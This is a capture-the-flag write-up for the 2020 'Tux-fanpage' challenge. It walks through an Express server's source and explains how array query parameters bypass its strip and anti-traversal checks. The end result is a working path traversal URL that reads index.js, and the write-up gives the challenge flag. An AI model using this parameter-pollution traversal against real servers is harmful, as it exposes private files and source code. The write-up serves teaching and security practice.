## Tux-fanpage :

The description of this challenge was : " My friend made a fanpage for Tux , can you steal the source code for me? " and the home page was presented like this :

![Capture](https://user-images.githubusercontent.com/59454895/85960368-567c0e80-b9a3-11ea-9c0e-7f4cf8068294.PNG)

The source code of the server is as follows:

const express = require('express')
const path = require('path')
const app = express()

//Don't forget to redact from published source
const flag = '[REDACTED]'

app.get('/', (req, res) => {
    res.redirect('/page?path=index.html')
})

app.get('/page', (req, res) => {

    let path = req.query.path

    //Handle queryless request
    if(!path || !strip(path)){
        res.redirect('/page?path=index.html')
        return
    }
    path = strip(path)

    path = preventTraversal(path)

    res.sendFile(prepare(path), (err) => {
        if(err){
            if (! res.headersSent) {
                try {
                    res.send(strip(req.query.path) + ' not found')
                } catch {
                    res.end()
                }
            }
        }
    })
})

//Prevent directory traversal attack
function preventTraversal(dir){
    if(dir.includes('../')){
        let res = dir.replace('../', '')
        return preventTraversal(res)
    }

    //In case people want to test locally on windows
    if(dir.includes('..\\')){
        let res = dir.replace('..\\', '')
        return preventTraversal(res)
    }
    return dir
}

//Get absolute path from relative path
function prepare(dir){
    return path.resolve('./public/' + dir)
}

//Strip leading characters
function strip(dir){
    const regex = /^[a-z0-9]$/im

    //Remove first character if not alphanumeric
    if(!regex.test(dir[0])){
        if(dir.length > 0){
            return strip(dir.slice(1))
        }
        return ''
    }

    return dir
}

app.listen(3000, () => {
    console.log('listening on 0.0.0.0:3000')
})
The qs package is used by express to parse the request params. This package can also accept arrays from the request params if they are passed as follows:

https://mysite.tld/route?param[]=1&param[]=2
This treats param as an array [1,2]. We can use this property to exploit this websie.

Upon analysis, we see that the page is the accepted from the query, hence passing something like ../index.js will give us the source code which has the flag. But here's the catch. There are 2 functions which prevent anything of this sort. First, the strip function removes characters from the start of the string until it matches the regex /^[a-z0-9]$/im. However, if the start of the string matches this regex, it will not check any further. This prevents us from having absolute paths like /etc/passwd or paths starting with ../ in the page param.

The second function which we need to bypass is the preventTraversal function, which recursively removes all instances of ../ from your string.

Now, let's analyze what happens if we pass an array as the page param.

First, we encounter the strip function.

const regex = /^[a-z0-9]$/im

//Remove first character if not alphanumeric
if(!regex.test(dir[0])){
    if(dir.length > 0){
        return strip(dir.slice(1))
    }
    return ''
}

return dir
This takes the parameter dir (which is page, basically), and matches the first index with the regex. However, since page and hence dir is now an array, it will just check the first element of the array. We want dir to be returned as is, so the first element of the array has to match that regex. Our payload so far is:

https://tux-fanpage.2020.redpwnc.tf/?page[]=a
We get back the same path from the strip function, so now we have to bypass the preventTraversal function.

path = strip(path) // returns same path if path[0]='a'

path = preventTraversal(path)
The preventTraversal function looks like:

function preventTraversal(dir){
    if(dir.includes('../')){
        let res = dir.replace('../', '')
        return preventTraversal(res)
    }

    //In case people want to test locally on windows
    if(dir.includes('..\\')){
        let res = dir.replace('..\\', '')
        return preventTraversal(res)
    }
    return dir
}
In case dir is a string, it checks if the string has ../ in it, and removes every instance of it, recursively. Now, since dir is an array, dir.includes('../) will match only if an element of the array is exactly ../. So we are now free to do ../something, because that does not match ../ exactly. So, we can update our payload:

https://tux-fanpage.2020.redpwnc.tf/?page[]=a&page[]=../something
Now let's figure out what the something is going to be. So, the page is actually loaded in the following code snippet:

res.sendFile(prepare(path), (err) => {
    if(err){
        if (! res.headersSent) {
            try {
                res.send(strip(req.query.path) + ' not found')
            } catch {
                res.end()
            }
        }
    }
})
The path of the file is obtained using the prepare function, let's check that out.

function prepare(dir){
    return path.resolve('./public/' + dir)
}
Okay, so here's a problem. dir is an array, can we add an array to a string? Well, apparently you can, in javascript.

> 'hello'+[1,2,3]
"hello1,2,3"
So it just concatenates the comma separated array to the end of the string. That's really useful for this challenge! Now, we have to think of an array of dir so that path.resolve('./public/' + dir) returns ./index.html, keeping in mind the previous things we established.

> dir = ['a', '/../../index.js']
> './public/' + dir
"./public/a,/../../index.js"
When you pass this string to path.resolve(), it resolves it to ./index.js (It does not matter if the directory a, does not exist, path.resolve() does not care). Great! We've found our payload.

https://tux-fanpage.2020.redpwnc.tf/page?path[]=a&path[]=/../../index.js
This returns the source code. The flag is:

flag{tr4v3rsal_Tim3}
